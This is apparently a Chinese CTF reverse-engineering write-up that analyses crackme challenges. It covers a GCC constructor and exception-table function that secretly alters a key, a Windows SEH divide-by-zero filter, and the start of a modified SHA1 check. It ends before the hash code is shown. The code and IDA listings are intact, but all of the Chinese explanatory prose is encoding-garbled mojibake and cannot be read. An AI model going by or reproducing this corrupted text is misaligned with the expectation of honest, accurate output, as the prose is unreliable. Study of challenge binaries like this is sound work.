<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">sub_401550</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = &amp;Str[<span class="built_in">strlen</span>(Str)];</span><br><span class="line">  <span class="built_in">strcpy</span>(result, <span class="string">&quot;TCL,trackYYDS&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯åœ¨åŸæ¥keyåé™„åŠ äº†"TCL,trackYYDS".</p>
<p>ç°åœ¨çš„é—®é¢˜æ˜¯,è¿™ä¸ªsub_401550æ˜¯è¢«è°,å†ä½•æ—¶è°ƒç”¨çš„?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110191710527.png"
alt="image-20221110191710527" />
<figcaption aria-hidden="true">image-20221110191710527</figcaption>
</figure>
<p>çœ‹äº¤å‰å¼•ç”¨,è¯¥å‡½æ•°çš„å…¥å£è¢«ç»´æŠ¤åœ¨ä¸€å¼ RUNTIME_FUNCTIONè¡¨ä¸Š,è¿™ä¸ªè¡¨åˆå«ExceptionDir,çœ‹æ¥æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.pdata:0000000000405000 ExceptionDir    RUNTIME_FUNCTION &lt;rva nullsub_1, rva algn_401001, rva stru_406000&gt;</span><br><span class="line">.pdata:000000000040500C                 RUNTIME_FUNCTION &lt;rva pre_c_init, rva algn_401121, rva stru_406004&gt;</span><br><span class="line">.pdata:0000000000405018                 RUNTIME_FUNCTION &lt;rva pre_cpp_init, rva algn_401179, rva stru_40600C&gt;</span><br><span class="line">.pdata:0000000000405024                 RUNTIME_FUNCTION &lt;rva sub_401180, rva algn_4014A6, rva stru_406014&gt;</span><br><span class="line">.pdata:0000000000405030                 RUNTIME_FUNCTION &lt;rva WinMainCRTStartup, rva algn_4014D2, \</span><br><span class="line">.pdata:0000000000405030                                   rva stru_406028&gt;</span><br><span class="line">.pdata:000000000040503C                 RUNTIME_FUNCTION &lt;rva start, rva algn_401502, rva stru_406048&gt;</span><br><span class="line">.pdata:0000000000405048                 RUNTIME_FUNCTION &lt;rva sub_401510, rva algn_401529, rva stru_406068&gt;</span><br><span class="line">.pdata:0000000000405054                 RUNTIME_FUNCTION &lt;rva sub_401530, rva algn_40153C, rva stru_406070&gt;</span><br><span class="line">.pdata:0000000000405060                 RUNTIME_FUNCTION &lt;rva nullsub_2, rva algn_401541, rva stru_406074&gt;</span><br><span class="line">.pdata:000000000040506C                 RUNTIME_FUNCTION &lt;rva sub_401550, rva strcmp, rva stru_406078&gt;</span><br><span class="line">.pdata:0000000000405078                 RUNTIME_FUNCTION &lt;rva strcmp, rva main, rva stru_406084&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªè¡¨ä¹Ÿæ˜¯PEå¤´çš„å¯¼å…¥ç›®å½•ä¹‹ä¸€</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110192410257.png"
alt="image-20221110192410257" />
<figcaption aria-hidden="true">image-20221110192410257</figcaption>
</figure>
<p>ç¨‹åºåŸºå€åœ¨0x400000åŠ ä¸Š0x5000,æ­£å¥½å°±æ˜¯idaä¸­çš„ExceptionDir</p>
<p>æŸ¥äº†ä¸€ä¸‹,è¿™æ˜¯win64ä¸Šçš„å¼‚å¸¸å¤„ç†<a
target="_blank" rel="noopener" href="https://dbgtech.github.io/2017/08/04/Windows-X64-Try-Except-Finally.html">Windows
X64çš„Ring3å±‚å¼‚å¸¸å¤„ç†æœºåˆ¶ | DbgTech</a></p>
<p>æƒ³è¦å½»åº•å¼„æ˜ç™½,é¦–å…ˆå¾—æŠŠå¼‚å¸¸å¤„ç†è¿™ä¸€å¥—å¼„æ˜ç™½,ç•™ä½œåè¯</p>
<h4 id="åˆ†æfake_key.elf">åˆ†æfake_key.elf</h4>
<p>è¿˜ç»™äº†ä¸€ä¸ªlinuxä¸Šçš„ç¨‹åº,è¿™ä¸ªä¼šä¿®æ”¹keyçš„å‡½æ•°æ”¾åœ¨ä¸€ä¸ª<code>_init_array</code>çš„è¡¨ä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.init_array:0000000000003D88 ; ELF Initialization Function Table</span><br><span class="line">.init_array:0000000000003D88 ; ===========================================================================</span><br><span class="line">.init_array:0000000000003D88</span><br><span class="line">.init_array:0000000000003D88 ; Segment type: Pure data</span><br><span class="line">.init_array:0000000000003D88 ; Segment permissions: Read/Write</span><br><span class="line">.init_array:0000000000003D88 _init_array     segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.init_array:0000000000003D88                 assume cs:_init_array</span><br><span class="line">.init_array:0000000000003D88                 ;org 3D88h</span><br><span class="line">.init_array:0000000000003D88 initArray       dq offset loc_11E0      ; DATA XREF: LOAD:0000000000000168â†‘o</span><br><span class="line">.init_array:0000000000003D88                                         ; LOAD:00000000000002F0â†‘o ...</span><br><span class="line">.init_array:0000000000003D90                 dq offset changeKey</span><br><span class="line">.init_array:0000000000003D90 _init_array     ends</span><br><span class="line">.init_array:0000000000003D90</span><br><span class="line">.fini_array:0000000000003D98 ; ELF Termination Function Table</span><br><span class="line">.fini_array:0000000000003D98 ; ===========================================================================</span><br><span class="line">.fini_array:0000000000003D98</span><br><span class="line">.fini_array:0000000000003D98 ; Segment type: Pure data</span><br><span class="line">.fini_array:0000000000003D98 ; Segment permissions: Read/Write</span><br><span class="line">.fini_array:0000000000003D98 _fini_array     segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.fini_array:0000000000003D98                 assume cs:_fini_array</span><br><span class="line">.fini_array:0000000000003D98                 ;org 3D98h</span><br><span class="line">.fini_array:0000000000003D98 finiArray       dq offset __do_global_dtors_aux</span><br><span class="line">.fini_array:0000000000003D98                                         ; DATA XREF: __libc_csu_init+1Dâ†‘o</span><br><span class="line">.fini_array:0000000000003D98 _fini_array     ends</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ª<code>_init_array</code>è¡¨åœ¨èŠ‚å¤´è¡¨ä¸­</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110193559281.png"
alt="image-20221110193559281" />
<figcaption aria-hidden="true">image-20221110193559281</figcaption>
</figure>
<p>åœ¨initArrayä¸ŠæŒ‰xçœ‹äº¤å‰å¼•ç”¨</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110194420955.png"
alt="image-20221110194420955" />
<figcaption aria-hidden="true">image-20221110194420955</figcaption>
</figure>
<p>å‘ç°<code>__libc_csu_init</code>å‡½æ•°ä¼šå¼•ç”¨è¯¥è¡¨</p>
<p>è¿™ä¸ªå‡½æ•°å¹²äº†å•¥?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall _libc_csu_init(<span class="type">unsigned</span> <span class="type">int</span> a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 end; <span class="comment">// rbp</span></span><br><span class="line">  __int64 begin; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  init_proc();</span><br><span class="line">  end = ((<span class="type">char</span> *)&amp;finiArray - (<span class="type">char</span> *)&amp;initArray) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( end )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( begin = <span class="number">0LL</span>; begin != end; ++begin )</span><br><span class="line">      ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, __int64))*(&amp;initArray + begin))(a1, a2, a3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆè°ƒç”¨äº†ä¸€ä¸ªinit_proc</p>
<blockquote>
<p>è¿™ä¸ªå‡½æ•°åˆ¤æ–­gmon_startæ ‡å¿—æ˜¯å¦å·²ç»èµ·æ¥äº†,å¦‚æœå¦åˆ™è°ƒç”¨_gmon_start__å‡½æ•°</p>
<p>å‚è€ƒäº†</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ebd516326a36">Linux
ç¨‹åºç¬¦å·__gmon_start__ - ç®€ä¹¦ (jianshu.com)</a></p>
<p><a
target="_blank" rel="noopener" href="https://stackoverflow.com/questions/12697081/what-is-the-gmon-start-symbol">c
- What is the "<strong>gmon_start</strong>" symbol? - Stack
Overflow</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 (**init_proc())(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 (**result)(<span class="type">void</span>); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = &amp;_gmon_start__;</span><br><span class="line">  <span class="keyword">if</span> ( &amp;_gmon_start__ )</span><br><span class="line">    result = (__int64 (**)(<span class="type">void</span>))_gmon_start__();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„monåº”è¯¥æ˜¯monitor,ç›‘è§†å™¨çš„æ„æ€,ä»–å¥½åƒä¼šç›‘è§†ç¨‹åºçš„æ€§èƒ½,è®°å½•ä¸€äº›æ•°æ®,åæ­£å’Œç¨‹åºé€»è¾‘å…³ç³»ä¸å¤§,</p>
</blockquote>
<p>ç„¶åç±»ä¼¼äºè¿­ä»£å™¨,è®¡ç®—end,å³init_arrayçš„æœ€åä¸€é¡¹ä¹‹å,</p>
<p><code>end = ((char *)&amp;finiArray - (char *)&amp;initArray) &gt;&gt; 3;</code>è¿™é‡Œå³ç§»ä¸‰ä½ç›¸å½“äºé™¤ä»¥8,åŸå› æ˜¯<code>_init_array</code>ä¸­ç»´æŠ¤çš„éƒ½æ˜¯å‡½æ•°å…¥å£åœ°å€,æ¯ä¸ªåœ°å€éƒ½æ˜¯8å­—èŠ‚çš„,é™¤ä»¥å…«æ‰å¾—åˆ°ä¸‹æ ‡</p>
<p>ç„¶åbeginä»0éå†åˆ°end,ä¹Ÿå°±æ˜¯éå†äº†è¿™ä¸ª<code>_init_array</code>è¡¨</p>
<p>æ¯æ¬¡éå†éƒ½ä¼šæ‰§è¡Œä¸€ä¸ª<code>((void (__fastcall *)(_QWORD, __int64, __int64))*(&amp;initArray + begin))(a1, a2, a3);</code></p>
<p>æŠŠ<code>_init_array</code>ä¸­çš„è¡¨é¡¹,ä¹Ÿå°±æ˜¯å‡½æ•°å…¥å£ç‚¹,å¸¦ç€(a1,a2,a3)ä¸‰ä¸ªå‚æ•°å»æ‰§è¡Œ</p>
<p>æ˜¾ç„¶initArrayä¸­æœ‰ä¸¤ä¸ªè¡¨é¡¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.init_array:0000000000003D88 _init_array     segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.init_array:0000000000003D88                 assume cs:_init_array</span><br><span class="line">.init_array:0000000000003D88                 ;org 3D88h</span><br><span class="line">.init_array:0000000000003D88 initArray       dq offset loc_11E0      ; DATA XREF: LOAD:0000000000000168â†‘o</span><br><span class="line">.init_array:0000000000003D88                                         ; LOAD:00000000000002F0â†‘o ...</span><br><span class="line">.init_array:0000000000003D90                 dq offset changeKey</span><br><span class="line">.init_array:0000000000003D90 _init_array     ends</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªchangeKeyå‡½æ•°æ˜¯ç¬¬äºŒä¸ªè¢«æ‰§è¡Œçš„,æ˜¾ç„¶å®ƒç”¨ä¸åˆ°a1,a2,a3ä¸‰ä¸ªå‚æ•°.</p>
<p>ä¸‹é¢é—®é¢˜æ˜¯,<code>_libc_csu_init</code>è¿™ä¸ªå‡½æ•°æ˜¯å¹²å•¥çš„,è¢«è°,åœ¨å•¥æ—¶å€™æ‰§è¡Œ</p>
<p>äº¤å‰å¼•ç”¨è¡¨æ˜åªæœ‰startå‡½æ•°ä¼šè°ƒç”¨å®ƒ</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110195924354.png"
alt="image-20221110195924354" />
<figcaption aria-hidden="true">image-20221110195924354</figcaption>
</figure>
<p>startæ˜¯ç¨‹åºå…¥å£ç‚¹,å®ƒè°ƒç”¨äº†<code>_libc_start_main</code>,è¿™ä¸ªå‡½æ•°ä¼šåŒæ—¶å¸¦ç€mainå‡½æ•°å’Œ<code>_libc_csu_init</code>å‡½æ•°ä½œä¸ºå‚æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">start</span><span class="params">(__int64 a1, __int64 a2, <span class="type">void</span> (*a3)(<span class="type">void</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = v5;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  _libc_start_main(</span><br><span class="line">    (<span class="type">int</span> (__fastcall *)(<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **))main,</span><br><span class="line">    v4,</span><br><span class="line">    &amp;retaddr,</span><br><span class="line">    (<span class="type">void</span> (*)(<span class="type">void</span>))_libc_csu_init,</span><br><span class="line">    fini,</span><br><span class="line">    a3,</span><br><span class="line">    &amp;v5);</span><br><span class="line">  __halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢é—®é¢˜å°±æ˜¯<code>_libc_start_main</code>çš„é€»è¾‘äº†,è¿™å®é™…ä¸Šæ˜¯linuxç¨‹åºä»åŠ è½½åˆ°mainä¹‹å‰çš„é€»è¾‘,å‚è€ƒç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…».ç•™ä½œåè¯</p>
<p>å¯ä»¥ç¡®å®šçš„ä¸€ç‚¹æ˜¯<code>_libc_csu_init</code>æ˜¯å…ˆäºmainå‡½æ•°æ‰§è¡Œçš„,å› æ­¤mainæ‰§è¡Œä¹‹å‰keyå·²ç»è¢«ä¿®æ”¹äº†</p>
<h4 id="æ€ä¹ˆå‡ºçš„é¢˜">æ€ä¹ˆå‡ºçš„é¢˜?</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__attribute((constructor)) <span class="type">static</span> <span class="type">void</span> <span class="title function_">fun</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">strcat</span>(key,<span class="string">&quot;TCL,trackYYDS&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªfunå‡½æ•°è¢«<code>__attribute((constructor))</code>ä¿®é¥°,è¿™æ˜¯GNUç¼–è¯‘å™¨çš„æ‹“å±•è¯­æ³•</p>
<blockquote>
<p>__attribute__ä»‹ç»</p>
<p>å‚è€ƒ<a
target="_blank" rel="noopener" href="https://www.jianshu.com/p/dd425b9dc9db"><strong>attribute</strong>((constructor))ç”¨æ³•è§£æ
- ç®€ä¹¦ (jianshu.com)</a></p>
<p>__attribute__å¯ä»¥è®¾ç½®å‡½æ•°å±æ€§(Function Attribute)ã€å˜é‡å±æ€§(Variable
Attribute)å’Œç±»å‹å±æ€§(Type
Attribute)ã€‚__attribute__å‰åéƒ½æœ‰ä¸¤ä¸ªä¸‹åˆ’çº¿ï¼Œå¹¶ä¸”åé¢ä¼šç´§è·Ÿä¸€å¯¹åŸæ‹¬å¼§ï¼Œæ‹¬å¼§é‡Œé¢æ˜¯ç›¸åº”çš„__attribute__å‚æ•°</p>
<p>__attribute__è¯­æ³•æ ¼å¼ä¸ºï¼šattribute ( ( attribute-list ) )</p>
<p>å¦‚æœå‡½æ•°è¢«è®¾å®šä¸ºconstructorå±æ€§ï¼Œåˆ™è¯¥å‡½æ•°ä¼šåœ¨mainï¼ˆï¼‰å‡½æ•°æ‰§è¡Œä¹‹å‰è¢«è‡ªåŠ¨çš„æ‰§è¡Œï¼›è‹¥å‡½æ•°è¢«è®¾å®šä¸ºdestructorå±æ€§ï¼Œåˆ™è¯¥å‡½æ•°ä¼šåœ¨mainï¼ˆï¼‰å‡½æ•°æ‰§è¡Œä¹‹åæˆ–è€…exitï¼ˆï¼‰è¢«è°ƒç”¨åè¢«è‡ªåŠ¨çš„æ‰§è¡Œã€‚</p>
</blockquote>
<p>æ˜¯ä¸€ç§æ¯”è¾ƒæ˜æ˜¾çš„åè°ƒè¯•æ‰‹æ®µ</p>
<h4 id="fake_code">fake_code</h4>
<p>åˆæ˜¯å¼‚å¸¸å¤„ç†,é—ç•™çš„é—®é¢˜æ˜¯,å¦‚ä½•è¿‡æ»¤å¼‚å¸¸,åªå¯¹é™¤é›¶å¼‚å¸¸æ„Ÿå…´è¶£</p>
<p>è¿™æ ·å‡ºçš„é¢˜:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FilterFunc</span><span class="params">(<span class="type">int</span> dwExceptionCode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)</span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">		__try &#123;</span><br><span class="line">            index = (<span class="number">0x7f</span> * index + <span class="number">0x66</span>) % <span class="number">0xff</span>;</span><br><span class="line">            tmp = index &gt;&gt; <span class="number">7</span>;</span><br><span class="line">            tmp = <span class="number">1</span> / tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        __except (FilterFunc(GetExceptionCode())) &#123;</span><br><span class="line">            key = (<span class="number">97</span> * key + <span class="number">101</span>) % <span class="number">233</span>;</span><br><span class="line">            key ^= <span class="number">0x29</span>;</span><br><span class="line">            <span class="comment">//printf(&quot;catch i = %d\n&quot;, i);</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>tryå—ä¸­ä¸ç®¡å‘ç”Ÿäº†ä»€ä¹ˆå¼‚å¸¸,åªè¦æ˜¯å¼‚å¸¸,éƒ½ä¼šè¿›å…¥exceptå—</p>
<p>è¿™exceptçš„å‚æ•°æ˜¯è°ƒç”¨äº†FilterFuncå‡½æ•°,ç»™FilterFuncå‡½æ•°ä¼ é€’çš„å‚æ•°æ˜¯GetExceptionCode(),ä¹Ÿå°±æ˜¯tryä¸­å‘ç”Ÿçš„å¼‚å¸¸çš„ç±»å‹.</p>
<p>FilterFuncä¸­,å½“ä¼ é€’çš„å‚æ•°æ˜¯é™¤é›¶å¼‚å¸¸æ—¶,è¿”å›EXCEPTION_EXECUTE_HANDLERè¿™ä¹ˆä¸€ä¸ªæšä¸¾å€¼,å¦åˆ™éƒ½ä¼šè¿”å›EXCEPTION_CONTINUE_SEARCHè¿™ä¹ˆä¸€ä¸ªæšä¸¾å€¼</p>
<p>ç„¶åexceptæ ¹æ®FilterFuncçš„è¿”å›å€¼åˆ¤æ–­æ˜¯å¦è¿›å…¥exceptå—,æ€ä¹ˆä¸ªè¯„åˆ¤æ ‡å‡†å‘¢?</p>
<p>å‚è€ƒ<a
target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/debug/exception-handler-syntax">Exception-Handler
Syntax - Win32 apps | Microsoft Learn</a></p>
<table>
<colgroup>
<col style="width: 34%" />
<col style="width: 65%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">Value</th>
<th style="text-align: left;">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td
style="text-align: left;"><strong>EXCEPTION_EXECUTE_HANDLER</strong></td>
<td style="text-align: left;">The system transfers control to the
exception handler, and execution continues in the stack frame in which
the handler is
found.<br />ç³»ç»Ÿå°†æ§åˆ¶ç§»äº¤ç»™å¼‚å¸¸å¤„ç†å‡½æ•°,ä¹Ÿå°±æ˜¯å½“å‰å‡½æ•°æ ˆå¸§ä¸­çš„exceptå—</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>EXCEPTION_CONTINUE_SEARCH</strong></td>
<td style="text-align: left;">The system continues to search for a
handler.<br />ç³»ç»Ÿå°†ä¸æ˜¯ç”¨å½“å‰å‡½æ•°æ ˆå¸§ä¸­çš„exceptå—ä¸­çš„å¼‚å¸¸å¤„ç†,è€Œæ˜¯æ²¿ç€sehé“¾ä¸Šæº¯æ—©æœŸæ³¨å†Œçš„å¼‚å¸¸å¤„ç†å‡½æ•°,è€Œæ—©æœŸæ³¨å†Œçš„å¼‚å¸¸å¤„ç†å‡½æ•°éƒ½æ˜¯ç³»ç»Ÿæ³¨å†Œçš„æˆ–è€…è¿è¡Œç¯å¢ƒæ³¨å†Œçš„,æ²¡æœ‰é’ˆå¯¹æ€§,ç›¸å½“äºæ˜¯èµ°ä¸ªè¿‡åœº,ä¹Ÿä¸ä¼šå¯¹ç¨‹åºé€»è¾‘é€ æˆå¾ˆå¤§çš„å½±å“.<br />è€Œé™¤é›¶å¼‚å¸¸ä¼šè¢«è¿”å›EXCEPTION_EXECUTE_HANDLER,è¿›å…¥äº‘ä¹‹å›è‡ªå®šä¹‰çš„exceptå—,è¿™ä¸ªå—å°±æœ‰å®é™…ä½œç”¨äº†.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>EXCEPTION_CONTINUE_EXECUTION</strong></td>
<td style="text-align: left;">The system stops its search for a handler
and returns control to the point at which the exception occurred. If the
exception is noncontinuable, this results in an
<strong>EXCEPTION_NONCONTINUABLE_EXCEPTION</strong>
exception.<br />ç³»ç»Ÿå¿½ç•¥å¼‚å¸¸,æ§åˆ¶è¿˜ç»™ç¨‹åºå¼‚å¸¸ç‚¹ç»§ç»­æ‰§è¡Œ.<br />å¦‚æœå¼‚å¸¸åœ°å¤ªå‰å®³æ‰§è¡Œä¸åŠ¨äº†,å°†ä¼šåˆè§¦å‘EXCEPTION_NONCONTINUABLE_EXCEPTIONå¼‚å¸¸</td>
</tr>
</tbody>
</table>
<h3 id="broken_hash">broken_hash</h3>
<h4 id="å½“æ—¶çš„åšæ³•éé¢„æœŸ">å½“æ—¶çš„åšæ³•(éé¢„æœŸ)</h4>
<p>å½“æ—¶æƒ³åˆ°ä¸€ä¸ªéé¢„æœŸè§£,ä½†æ˜¯è®¤ä¸ºBYTE,WORD,è¿˜æœ‰char,int,unsignedç­‰ç­‰è¿™äº›ç©æ„å„¿è½¬æ¢å¤ªè´¹è„‘å­äº†å°±æ²¡æ•´,å®é™…ä¸Šä¸éš¾</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;This is a surprise!&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Give me your flag: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">index = <span class="number">-1</span>i64;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  ++index;</span><br><span class="line"><span class="keyword">while</span> ( input[index] );</span><br><span class="line"><span class="keyword">if</span> ( index == <span class="number">88</span> )</span><br><span class="line">&#123;</span><br><span class="line">  encrypt(input);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">88</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    temp_check = check &amp;&amp; encrypted[i] == target[i];</span><br><span class="line">    check = temp_check;</span><br><span class="line">    <span class="keyword">if</span> ( !temp_check )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v7();</span><br><span class="line">  <span class="keyword">if</span> ( check )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, aTtttqqqqqqqlll);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, aWhatAPityPlzTr);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€»è¾‘å°±æ˜¯è¾“å…¥è¦æœ‰88ä¸ªå­—ç¬¦,ç„¶åencryptå‡½æ•°å¯¹è¾“å…¥è¿›è¡ŒåŠ å¯†,åŠ å¯†ä¹‹åå¯†æ–‡æ”¾åœ¨encryptedæ•°ç»„ä¸­,å†å’Œå®ç°æ”¾ç½®çš„å¯†æ–‡targetè¿›è¡Œæ¯”è¾ƒ,å…¨å¯¹åˆ™é€šè¿‡</p>
<p>å…³é”®å°±åœ¨äºencryptè¿™ä¸ªå‡½æ•°,å‡ºé¢˜äººå‚è€ƒçš„<a
target="_blank" rel="noopener" href="https://github.com/B-Con/crypto-algorithms/blob/master/sha1.c">crypto-algorithms/sha1.c
at master Â· B-Con/crypto-algorithms
(github.com)</a>.fake_codeè¿™ä¸ªé¢˜é‡Œé¢çš„SHA1åŠ å¯†ä»£ç æ˜¯ç›´æ¥æŠ„çš„,ç„¶åæ”¹äº†å‡ ä¸ªå‚æ•°</p>
<p>sha1åŠ å¯†çš„ä¸»é€»è¾‘é•¿è¿™æ ·,å‡½æ•°åè¿˜æœ‰å˜é‡åæœ‰ä¿®æ”¹</p>
